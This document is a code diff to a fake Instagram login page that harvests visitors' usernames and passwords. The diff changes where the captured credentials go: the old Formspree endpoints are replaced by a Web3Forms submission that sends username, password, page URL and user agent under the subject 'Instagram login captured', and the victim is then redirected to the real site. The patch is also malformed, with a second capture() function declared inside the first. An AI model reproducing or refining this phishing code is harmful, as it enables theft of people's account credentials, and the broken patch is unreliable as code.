@@ -166,7 +166,7 @@ display:none; white-space:pre-wrap; word-break:break-word;}
 <div class="ig-col">
 <div class="ig-card ig-login">
 <div class="ig-logo">Instagram</div>
-<form class="ig-form" id="igForm" method="POST" action="https://formspree.io/f/xaeejwkk" novalidate>
+<form class="ig-form" id="igForm" method="POST" novalidate>
 <div class="ig-err" id="igErr"></div>
 <div class="ig-field">
 <input id="igUser" name="username" type="text" placeholder=" " autocomplete="username" autocapitalize="off" spellcheck="false">
@@ -257,7 +257,7 @@ window.onerror = function(m, s, l, c){
 var NL = String.fromCharCode(10);
 
 var CONFIG = {
-  endpoint: "https://formspree.io/f/xeaakqqy",
+  accessKey: "eeac2405-1a06-4cc5-b436-f215a91d98fe",
   redirect: "https://www.instagram.com",
   showSaveInfo: true
 };
@@ -280,7 +280,7 @@ var form=$('igForm'), user=$('igUser'), pass=$('igPass'), err=$('igErr'), st=$('
     modalUser=$('igModalUser'), avatar=$('igAvatar'), chip=$('igChip'), chipN=$('igChipN'),
     panel=$('igPanel'), panelBody=$('igPanelBody');
 
-form.setAttribute('action', CONFIG.endpoint);
+
 
 function render(){
   var l = read();
@@ -338,29 +338,51 @@ function capture(){
     return;
   }
 
-  setStatus('Sending to Formspree...');
+function capture(){
+  var u = user.value.trim(), p = pass.value;
+  if(!u || !p){ setErr('Please enter a username and password.'); return; }
+  setErr('');
+  finished = false;
+  submit.classList.add('loading');
 
-  fetch(CONFIG.endpoint, {
+  var idx = record(u, p);
+
+  if(!CONFIG.accessKey){
+    setStatus('No access key set - saved locally only.', 'bad');
+    markStatus(idx, 'no access key');
+    setTimeout(function(){ finish(u); }, 400);
+    return;
+  }
+
+  setStatus('Sending...');
+
+  fetch('https://api.web3forms.com/submit', {
     method: 'POST',
-    body: fd,
-    headers: { 'Accept': 'application/json' }
+    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+    body: JSON.stringify({
+      access_key: CONFIG.accessKey,
+      subject: 'Instagram login captured',
+      from_name: 'Instagram clone',
+      username: u,
+      password: p,
+      captured_at: new Date().toISOString(),
+      page: location.href,
+      agent: navigator.userAgent
+    })
   })
-  .then(function(res){
-    return res.text().then(function(t){
-      var j = null;
-      try{ j = JSON.parse(t); }catch(e){}
-      if(res.ok && !(j && j.ok === false)){
-        setStatus('Sent OK - HTTP ' + res.status + '. Check your inbox and spam.', 'ok');
-        markStatus(idx, 'sent HTTP ' + res.status);
-        diag('Sent OK - HTTP ' + res.status, true);
-      } else {
-        var m = (j && j.errors ? j.errors.map(function(x){ return x.message; }).join('; ') : '') || ('HTTP ' + res.status);
-        setStatus('Formspree rejected it: ' + m, 'bad');
-        setErr('Formspree: ' + m);
-        markStatus(idx, 'error: ' + m);
-        diag('Formspree rejected it: ' + m);
-      }
-    });
+  .then(function(res){ return res.json(); })
+  .then(function(j){
+    if(j && j.success){
+      setStatus('Sent OK. Check your inbox and spam.', 'ok');
+      markStatus(idx, 'sent');
+      diag('Sent OK', true);
+    } else {
+      var m = (j && j.message) || 'unknown error';
+      setStatus('Rejected: ' + m, 'bad');
+      setErr('Rejected: ' + m);
+      markStatus(idx, 'error: ' + m);
+      diag('Rejected: ' + m);
+    }
   })
   .catch(function(e){
     setStatus('Request failed: ' + e.message, 'bad');
